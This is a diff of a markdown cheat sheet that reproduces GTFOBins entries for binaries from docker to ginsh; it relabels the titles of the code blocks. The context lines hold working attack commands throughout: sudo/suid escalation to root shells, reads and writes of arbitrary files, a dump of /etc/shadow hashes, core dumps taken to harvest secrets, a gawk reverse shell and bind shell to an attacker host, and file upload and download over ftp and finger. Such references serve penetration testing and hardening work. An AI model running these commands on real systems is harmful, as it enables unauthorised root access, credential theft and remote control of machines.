@@ -2518,7 +2572,7 @@ var CONTAINER_ID
 
 Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins docker file-write (sudo / suid / unprivileged)"
 echo $data >$tmp_file
 docker cp $tmp_file $CONTAINER_ID:temp-file
 docker cp $CONTAINER_ID $file_out
@@ -2536,7 +2590,7 @@ var CONTAINER_ID
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dos2unix file-read (sudo / suid / unprivileged)"
 dos2unix -f -O $file_in
 ```
 <!-- cheat
@@ -2547,7 +2601,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dos2unix file-write (sudo / suid / unprivileged)"
 dos2unix -f -n $file_in $file_out
 ```
 <!-- cheat
@@ -2563,7 +2617,7 @@ Basically `dosbox` allows to mount the local file system, so that it can be alte
 
 The file content will be displayed in the DOSBox graphical window.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dosbox file-read #1 (sudo / suid / unprivileged)"
 dosbox -c 'mount c /' -c 'type c:\path\to\input'
 ```
 <!-- cheat
@@ -2573,7 +2627,7 @@ dosbox -c 'mount c /' -c 'type c:\path\to\input'
 
 The file is copied to a readable location.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dosbox file-read #2 (sudo / suid / unprivileged)"
 dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
 cat $file_out
 ```
@@ -2585,7 +2639,7 @@ var file_out
 
 Note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dosbox file-write (sudo / suid / unprivileged)"
 dosbox -c 'mount c /' -c "echo $data >c:\path\to\output" -c exit
 ```
 <!-- cheat
@@ -2598,7 +2652,7 @@ var data
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins dotnet shell (sudo / unprivileged)"
 dotnet fsi
 System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
 ```
@@ -2609,7 +2663,7 @@ System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins dotnet file-read (sudo / unprivileged)"
 dotnet fsi
 System.IO.File.ReadAllText("$file_in");;
 ```
@@ -2623,7 +2677,7 @@ var file_in
 
 Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo 'exec /bin/sh' >x.sh fpm -n x -s dir -t deb -a all --before-install x.sh . ```
 
-```sh title:"sudo"
+```sh title:"GTFOBins dpkg shell (sudo)"
 dpkg -i x_1.0_all.deb
 ```
 <!-- cheat
@@ -2633,7 +2687,7 @@ dpkg -i x_1.0_all.deb
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dpkg inherit (inherits from less) (sudo / suid / unprivileged)"
 dpkg -l
 ```
 <!-- cheat
@@ -2645,7 +2699,7 @@ dpkg -l
 
 `dstat` allows you to run arbitrary Python scripts loaded as "external plugins" if they are located in one of the directories, stated in the `dstat` man page under "FILES":  - `~/.dstat/` - `(path of binary)/plugins/` - `/usr/share/dstat/` - `/usr/local/share/dstat/`  Pick the one that you can write into. The plugin named `xxx` file name must be defined in the `dstat_xxx.py` file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins dstat inherit (inherits from python) (sudo / unprivileged)"
 dstat --xxx
 ```
 <!-- cheat
@@ -2657,7 +2711,7 @@ dstat --xxx
 
 The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.  ``` tex '\special{psfile="`/bin/sh 1>&0"}\end' ```
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dvips shell (sudo / suid / unprivileged)"
 dvips -R0 texput.dvi
 ```
 <!-- cheat
@@ -2669,7 +2723,7 @@ dvips -R0 texput.dvi
 
 This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).  Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:  ``` echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py ```
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins easy_install inherit (inherits from python) (sudo / unprivileged)"
 echo '...' >setup.py
 easy_install .
 ```
@@ -2682,7 +2736,7 @@ easy_install .
 
 This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins easyrsa shell (sudo / suid / unprivileged)"
 echo 'set_var X "$(/bin/sh 1>&0)"' >$tmp_file
 easyrsa --vars=$tmp_file
 ```
@@ -2698,7 +2752,7 @@ For this to work the target must be connected to an AWS instance via EB CLI.
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins eb inherit (inherits from journalctl) (sudo / unprivileged)"
 eb logs
 ```
 <!-- cheat
@@ -2710,7 +2764,7 @@ eb logs
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ed shell (sudo / suid / unprivileged)"
 ed
 !/bin/sh
 q
@@ -2722,7 +2776,7 @@ q
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ed file-read (sudo / suid / unprivileged)"
 ed $file_in
 ,p
 q
@@ -2735,7 +2789,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ed file-write (sudo / suid / unprivileged)"
 ed $file_out
 a
 $data
@@ -2754,7 +2808,7 @@ var file_out
 
 The content is actually parsed by the command.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins efax file-read (sudo / suid)"
 efax -d $file_in
 ```
 <!-- cheat
@@ -2767,7 +2821,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins egrep file-read (sudo / suid / unprivileged)"
 grep '' $file_in
 ```
 <!-- cheat
@@ -2780,7 +2834,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins elvish shell (sudo / suid / unprivileged)"
 elvish
 ```
 <!-- cheat
@@ -2790,7 +2844,7 @@ elvish
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins elvish file-read (sudo / suid / unprivileged)"
 elvish -c 'print (slurp <$file_in)'
 ```
 <!-- cheat
@@ -2801,7 +2855,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins elvish file-write (sudo / suid / unprivileged)"
 elvish -c 'print $data >$file_out'
 ```
 <!-- cheat
@@ -2817,7 +2871,7 @@ All the functions operate in the Emacs terminal interface.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins emacs shell (sudo / unprivileged)"
 emacs -Q -nw --eval '(term "/bin/sh")'
 ```
 <!-- cheat
@@ -2827,7 +2881,7 @@ emacs -Q -nw --eval '(term "/bin/sh")'
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins emacs file-read (sudo / unprivileged)"
 emacs $file_in
 ```
 <!-- cheat
@@ -2838,7 +2892,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins emacs file-write (sudo / unprivileged)"
 emacs $file_out
 $data
 C-x C-s
@@ -2854,7 +2908,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins enscript shell (sudo / suid / unprivileged)"
 enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
 ```
 <!-- cheat
@@ -2866,7 +2920,7 @@ enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins env shell (sudo / suid / unprivileged)"
 env /bin/sh
 ```
 <!-- cheat
@@ -2874,7 +2928,9 @@ env /bin/sh
 
 #### env shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins env shell - suid override (suid variant)"
 env /bin/sh -p
 ```
 <!-- cheat
@@ -2886,7 +2942,7 @@ env /bin/sh -p
 
 The content is actually parsed and corrupted by the command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins eqn file-read (sudo / suid / unprivileged)"
 eqn $file_in
 ```
 <!-- cheat
@@ -2899,7 +2955,7 @@ var file_in
 
 The file content appears in the middle of other textual information as phonemes.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins espeak file-read (sudo / suid / unprivileged)"
 espeak -qXf $file_in
 ```
 <!-- cheat
@@ -2912,7 +2968,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ex shell (sudo / suid / unprivileged)"
 ex -c ':!/bin/sh'
 ```
 <!-- cheat
@@ -2922,7 +2978,7 @@ ex -c ':!/bin/sh'
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ex inherit (inherits from ed) (sudo / suid / unprivileged)"
 ex
 ```
 <!-- cheat
@@ -2934,7 +2990,7 @@ ex
 
 If the permissions allow it, files are moved (instead of copied) to the destination.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins exiftool file-read (sudo / unprivileged)"
 exiftool -filename=$file_out $file_in
 cat $file_out
 ```
@@ -2947,7 +3003,7 @@ var file_out
 
 If the permissions allow it, files are moved (instead of copied) to the destination.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins exiftool file-write #1 (sudo / unprivileged)"
 exiftool -filename=$file_out $file_in
 ```
 <!-- cheat
@@ -2959,7 +3015,7 @@ var file_out
 
 The output file must exists, either empty or be a supported image file. The content is written amidst other content.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins exiftool file-write #2 (sudo / unprivileged)"
 exiftool "-description<=$file_in --filename $file_out
 ```
 <!-- cheat
@@ -2971,7 +3027,7 @@ var file_out
 
 The output file must exists, either empty or be a supported image file. The content is written amidst other content.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins exiftool file-write #3 (sudo / unprivileged)"
 exiftool "-description=$data --filename $file_out
 ```
 <!-- cheat
@@ -2983,7 +3039,7 @@ var file_out
 
 Writes the metadata tags of the input file in textual format to the output.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins exiftool file-write #4 (sudo / unprivileged)"
 exiftool -description -W $file_out --filename $file_in
 ```
 <!-- cheat
@@ -2995,7 +3051,7 @@ var file_out
 
 This allows to run Perl code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins exiftool inherit (inherits from perl) (sudo / unprivileged)"
 exiftool -if '...' /etc/passwd
 ```
 <!-- cheat
@@ -3007,7 +3063,7 @@ exiftool -if '...' /etc/passwd
 
 The read file content is corrupted by replacing tabs with spaces.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins expand file-read (sudo / suid / unprivileged)"
 expand $file_in
 ```
 <!-- cheat
@@ -3020,7 +3076,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins expect shell (sudo / suid / unprivileged)"
 expect -c 'spawn /bin/sh;interact'
 ```
 <!-- cheat
@@ -3028,7 +3084,9 @@ expect -c 'spawn /bin/sh;interact'
 
 #### expect shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins expect shell - suid override (suid variant)"
 expect -c 'spawn /bin/sh -p;interact'
 ```
 <!-- cheat
@@ -3038,7 +3096,7 @@ expect -c 'spawn /bin/sh -p;interact'
 
 The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins expect file-read (sudo / suid / unprivileged)"
 expect $file_in
 ```
 <!-- cheat
@@ -3051,7 +3109,7 @@ var file_in
 
 The first `.rb` file in the `$dir/` directory will be executed.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins facter inherit #1 (inherits from ruby) (sudo / unprivileged)"
 FACTERLIB=$dir/ facter
 ```
 <!-- cheat
@@ -3062,7 +3120,7 @@ var dir
 
 The first `.rb` file in the `$dir/` directory will be executed.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins facter inherit #2 (inherits from ruby) (sudo / unprivileged)"
 facter --custom-dir=$dir/ x
 ```
 <!-- cheat
@@ -3075,7 +3133,7 @@ var dir
 
 The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return code from the subprocess. The `banip` command will hang until the subprocess returns.
 
-```sh title:"sudo"
+```sh title:"GTFOBins fail2ban-client command #1 (sudo)"
 fail2ban-client add x
 fail2ban-client set x addaction x
 fail2ban-client set x action x actionban $cmd_file
@@ -3092,7 +3150,7 @@ var cmd_file
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo"
+```sh title:"GTFOBins fail2ban-client command #2 (sudo)"
 cat >$tmp_dir/fail2ban.conf <<EOF
 [Definition]
 EOF
@@ -3127,7 +3185,7 @@ var tmp_dir
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fastfetch shell (sudo / suid / unprivileged)"
 echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >$tmp_file
 fastfetch -c $tmp_file
 ```
@@ -3139,7 +3197,7 @@ var tmp_file
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fastfetch command (sudo / suid / unprivileged)"
 echo '{"modules":[{"type":"command","key":"x","text":"exec $cmd_file"}]}' >$tmp_file
 fastfetch -c $tmp_file
 ```
@@ -3152,7 +3210,7 @@ var tmp_file
 
 The file content is used as the logo while some other information is displayed on its right.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fastfetch file-read (sudo / suid / unprivileged)"
 fastfetch --file $file_in
 ```
 <!-- cheat
@@ -3165,7 +3223,7 @@ var file_in
 
 Load an attacker-supplied shared library.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ffmpeg library-load (sudo / suid / unprivileged)"
 ffmpeg -f lavfi -i anullsrc -af ladspa=file=$lib $tmp_file
 reset^J
 ```
@@ -3180,7 +3238,7 @@ var tmp_file
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fgrep file-read (sudo / suid / unprivileged)"
 grep '' $file_in
 ```
 <!-- cheat
@@ -3193,7 +3251,7 @@ var file_in
 
 Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins file file-read #1 (sudo / suid / unprivileged)"
 file -f $file_in
 ```
 <!-- cheat
@@ -3204,7 +3262,7 @@ var file_in
 
 Each line is corrupted by a prefix string and wrapped inside quotes.  If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.  It can also be provided with a directory and will read each file in the directory.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins file file-read #2 (sudo / suid / unprivileged)"
 file -m $file_in
 ```
 <!-- cheat
@@ -3217,7 +3275,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins find shell (sudo / suid / unprivileged)"
 find . -exec /bin/sh \; -quit
 ```
 <!-- cheat
@@ -3225,7 +3283,9 @@ find . -exec /bin/sh \; -quit
 
 #### find shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins find shell - suid override (suid variant)"
 find . -exec /bin/sh -p \; -quit
 ```
 <!-- cheat
@@ -3235,7 +3295,7 @@ find . -exec /bin/sh -p \; -quit
 
 This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins find file-read (sudo / suid / unprivileged)"
 find $file_in -exec cat {} \;
 ```
 <!-- cheat
@@ -3246,7 +3306,7 @@ var file_in
 
 `$data` is a format string, it supports some escape sequences.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins find file-write (sudo / suid / unprivileged)"
 find / -fprintf $file_out $data -quit
 ```
 <!-- cheat
@@ -3260,7 +3320,7 @@ var file_out
 
 The command hangs waiting for the remote peer to close the socket.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins finger download (sudo / suid / unprivileged)"
 finger x@$lhost
 ```
 <!-- cheat
@@ -3271,7 +3331,7 @@ import tun_ip
 
 The command hangs waiting for the remote peer to close the socket.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins finger upload (sudo / suid / unprivileged)"
 finger $data@$lhost
 ```
 <!-- cheat
@@ -3285,7 +3345,7 @@ var data
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins firejail shell (sudo / unprivileged)"
 firejail /bin/sh
 ```
 <!-- cheat
@@ -3297,7 +3357,7 @@ firejail /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fish shell (sudo / suid / unprivileged)"
 fish
 ```
 <!-- cheat
@@ -3309,7 +3369,7 @@ fish
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins flock shell (sudo / suid / unprivileged)"
 flock -u / /bin/sh
 ```
 <!-- cheat
@@ -3317,7 +3377,9 @@ flock -u / /bin/sh
 
 #### flock shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins flock shell - suid override (suid variant)"
 flock -u / /bin/sh -p
 ```
 <!-- cheat
@@ -3329,7 +3391,7 @@ flock -u / /bin/sh -p
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fmt file-read #1 (sudo / suid / unprivileged)"
 fmt -pNON_EXISTING_PREFIX $file_in
 ```
 <!-- cheat
@@ -3340,7 +3402,7 @@ var file_in
 
 This corrupts the output by wrapping very long lines at the given width (`999`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fmt file-read #2 (sudo / suid / unprivileged)"
 fmt -999 $file_in
 ```
 <!-- cheat
@@ -3353,7 +3415,7 @@ var file_in
 
 This corrupts the output by wrapping very long lines at the given width (`999`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fold file-read (sudo / suid / unprivileged)"
 fold -w999 $file_in
 ```
 <!-- cheat
@@ -3366,7 +3428,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins forge shell (sudo / suid / unprivileged)"
 echo '#!/bin/sh' >$tmp_file
 echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>$tmp_file
 chmod +x $tmp_file
@@ -3382,7 +3444,7 @@ var tmp_file
 
 Each line is treated as an hostname and it's leaked as an error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fping file-read (sudo / suid / unprivileged)"
 fping -f $file_in
 ```
 <!-- cheat
@@ -3395,7 +3457,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ftp shell (sudo / suid / unprivileged)"
 ftp
 !/bin/sh
 ```
@@ -3406,7 +3468,7 @@ ftp
 
 Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ftp download (sudo / suid / unprivileged)"
 ftp -a $lhost
 get $file_in output-file
 ```
@@ -3419,7 +3481,7 @@ var file_in
 
 Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ftp upload (sudo / suid / unprivileged)"
 ftp -a $lhost
 put $file_in output-file
 ```
@@ -3434,7 +3496,7 @@ var file_in
 
 Press `Enter` to receive the shell.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fzf shell (sudo / suid / unprivileged)"
 fzf --bind 'enter:execute(/bin/sh)'
 ```
 <!-- cheat
@@ -3444,7 +3506,7 @@ fzf --bind 'enter:execute(/bin/sh)'
 
 Commands can be issued via POST requests, for example:  ``` curl http://localhost:$lport -d 'execute($cmd_file)' ```
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins fzf command (sudo / suid / unprivileged)"
 fzf --listen=$lport
 ```
 <!-- cheat
@@ -3461,7 +3523,7 @@ Alias of [gcc](#gcc). All techniques from `gcc` apply.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gawk shell (sudo / suid / unprivileged)"
 gawk 'BEGIN {system("/bin/sh")}'
 ```
 <!-- cheat
@@ -3471,7 +3533,7 @@ gawk 'BEGIN {system("/bin/sh")}'
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gawk reverse-shell (sudo / suid / unprivileged)"
 gawk 'BEGIN {
     s = "/inet/tcp/0/$lhost/$lport";
     while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
@@ -3486,7 +3548,7 @@ import lports
 
 Bind a shell to a local port for the attacker to connect to.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gawk bind-shell (sudo / suid / unprivileged)"
 gawk 'BEGIN {
     s = "/inet/tcp/$lport/0/0";
     while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
@@ -3500,7 +3562,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gawk file-read (sudo / suid / unprivileged)"
 gawk '//' $file_in
 ```
 <!-- cheat
@@ -3511,7 +3573,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gawk file-write (sudo / suid / unprivileged)"
 gawk 'BEGIN { print "$data" > "$file_out" }'
 ```
 <!-- cheat
@@ -3525,7 +3587,7 @@ var file_out
 
 In some older versions, the `x` argument must instead reference any existing file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins gcc shell (sudo / unprivileged)"
 gcc -wrapper /bin/sh,-s x
 ```
 <!-- cheat
@@ -3535,7 +3597,7 @@ gcc -wrapper /bin/sh,-s x
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins gcc file-read #1 (sudo / unprivileged)"
 gcc -x c -E $file_in
 ```
 <!-- cheat
@@ -3546,7 +3608,7 @@ var file_in
 
 The file is read and parsed as a list of files (one per line), the content is displayed as error messages.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins gcc file-read #2 (sudo / unprivileged)"
 gcc @$file_in
 ```
 <!-- cheat
@@ -3557,7 +3619,7 @@ var file_in
 
 This actually deletes the file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins gcc file-write (sudo / unprivileged)"
 gcc -x c /dev/null -o $file_in
 ```
 <!-- cheat
@@ -3570,7 +3632,7 @@ var file_in
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gcloud inherit (inherits from less) (sudo / suid / unprivileged)"
 gcloud help
 ```
 <!-- cheat
@@ -3582,7 +3644,7 @@ gcloud help
 
 It can be used to generate core dumps of running processes (`$PID`). Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gcore file-read (sudo / suid / unprivileged)"
 gcore $PID
 ```
 <!-- cheat
@@ -3595,7 +3657,7 @@ var PID
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"capabilities / sudo / suid / unprivileged"
+```sh title:"GTFOBins gdb shell (capabilities / sudo / suid / unprivileged)"
 gdb -nx -ex '!/bin/sh' -ex quit
 ```
 <!-- cheat
@@ -3603,7 +3665,9 @@ gdb -nx -ex '!/bin/sh' -ex quit
 
 #### gdb shell - capabilities override
 
-```sh title:"capabilities variant"
+capabilities variant
+
+```sh title:"GTFOBins gdb shell - capabilities override (capabilities variant)"
 gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
 ```
 <!-- cheat
@@ -3613,7 +3677,7 @@ gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gdb file-write (sudo / suid / unprivileged)"
 gdb -nx -ex 'dump value $file_out "$data"' -ex quit
 ```
 <!-- cheat
@@ -3625,7 +3689,7 @@ var file_out
 
 This allows to run Python code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins gdb inherit (inherits from python) (sudo / suid / unprivileged)"
 gdb -nx -ex 'python ...' -ex quit
 ```
 <!-- cheat
@@ -3637,7 +3701,7 @@ gdb -nx -ex 'python ...' -ex quit
 
 This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins gem shell (sudo / unprivileged)"
 gem open -e '/bin/sh -s' debug
 ```
 <!-- cheat
@@ -3647,7 +3711,7 @@ gem open -e '/bin/sh -s' debug
 
 This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins gem inherit #1 (inherits from vi) (sudo / unprivileged)"
 gem open debug
 ```
 <!-- cheat
@@ -3657,7 +3721,7 @@ gem open debug
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins gem inherit #2 (inherits from ruby) (sudo / unprivileged)"
 gem build $script
 ```
 <!-- cheat
@@ -3668,7 +3732,7 @@ var script
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins gem inherit #3 (inherits from ruby) (sudo / unprivileged)"
 gem install --file $script
 ```
 <!-- cheat
@@ -3681,7 +3745,7 @@ var script
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins genie shell (sudo / suid / unprivileged)"
 genie -c '/bin/sh'
 ```
 <!-- cheat
@@ -3693,7 +3757,7 @@ genie -c '/bin/sh'
 
 The output is placed inside the ISO9660 file system binary format, it can be mounted or extracted with tools like `7z`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins genisoimage file-read #1 (sudo / suid / unprivileged)"
 genisoimage -q -o - $file_in
 ```
 <!-- cheat
@@ -3704,7 +3768,7 @@ var file_in
 
 The file is parsed, and some of its content is disclosed by the error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins genisoimage file-read #2 (sudo / suid / unprivileged)"
 genisoimage -sort $file_in
 ```
 <!-- cheat
@@ -3717,7 +3781,7 @@ var file_in
 
 This allows to dump password hashes from the `/etc/shadow` file.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins getent privilege-escalation (sudo / suid)"
 getent shadow
 ```
 <!-- cheat
@@ -3729,7 +3793,7 @@ getent shadow
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ghc shell (sudo / unprivileged)"
 ghc -e 'System.Process.callCommand "/bin/sh"'
 ```
 <!-- cheat
@@ -3741,7 +3805,7 @@ ghc -e 'System.Process.callCommand "/bin/sh"'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ghci shell (sudo / unprivileged)"
 ghci
 System.Process.callCommand "/bin/sh"
 ```
@@ -3754,7 +3818,7 @@ System.Process.callCommand "/bin/sh"
 
 This allows to run Python code (`...`). It hangs afterwards and can be terminated by pressing `Ctrl-C`.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins gimp inherit (inherits from python) (sudo / unprivileged)"
 gimp -idf --batch-interpreter=python-fu-eval -b '...'
 ```
 <!-- cheat
@@ -3766,7 +3830,7 @@ gimp -idf --batch-interpreter=python-fu-eval -b '...'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ginsh shell (sudo / suid / unprivileged)"
 ginsh
 !/bin/sh
 ```
